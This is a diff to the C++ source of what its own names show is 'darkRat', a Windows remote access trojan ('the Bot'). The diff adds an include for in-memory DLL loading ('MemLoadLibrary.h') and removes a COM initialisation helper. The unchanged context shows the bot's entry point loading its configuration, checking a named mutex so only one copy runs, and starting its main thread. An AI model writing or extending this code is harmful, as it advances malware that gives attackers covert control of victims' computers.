@@ -18,6 +18,7 @@
 #include <atlbase.h>
 #include <wtypes.h>
 #include <comutil.h>
+#include "MemLoadLibrary.h"
 #include "Helpers.hpp"
 #include "OsHelpers.hpp"
 #include "DarkRequest.h"
@@ -33,12 +34,6 @@
 
 
 
-struct ComInit
-{
-	HRESULT hr;
-	ComInit() : hr(::CoInitialize(nullptr)) {}
-	~ComInit() { if (SUCCEEDED(hr)) ::CoUninitialize(); }
-};
 
 
 
@@ -54,7 +49,8 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 		darkRat::config::config config = darkRat::config::load();
 		//Config config;
 		std::thread darkMain;
-		
+
+
 		//Check if the Bot is Running
 		std::string mutex = "Local\\" + config.mutex;
 		CreateMutexA(0, FALSE, mutex.c_str()); // try to create a named mutex
@@ -69,6 +65,8 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 				return 0;
 			}
 		}
+
+
 		
 
 		darkMain = std::thread(Client::darkMainThread, config);
